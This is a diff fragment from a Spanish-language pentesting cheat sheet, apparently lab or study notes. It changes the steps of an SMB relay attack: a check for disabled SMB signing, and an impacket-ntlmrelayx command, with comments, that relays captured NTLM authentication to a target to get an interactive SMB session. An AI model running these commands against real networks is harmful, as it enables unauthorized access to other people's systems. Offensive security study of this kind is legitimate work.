@@ -253,7 +253,9 @@ Paso 1:
 ❯ nxc smb IP           # Verificar que el server tenga (signing:False)
 
 Paso 2:
-❯ responder -I tun0    # Escuchar por la interfaz del tunel 	
+❯ impacket-ntlmrelayx -t IP -smb2support -i    # Levantar un servidor SMB en tu Kali para buscar la conexión de alguien 
+	# IP = Es laa dirección IP del server vulnerable 
+	# i = Obtener una sesión interactiva en SMB
 ```
 
 ```bash 
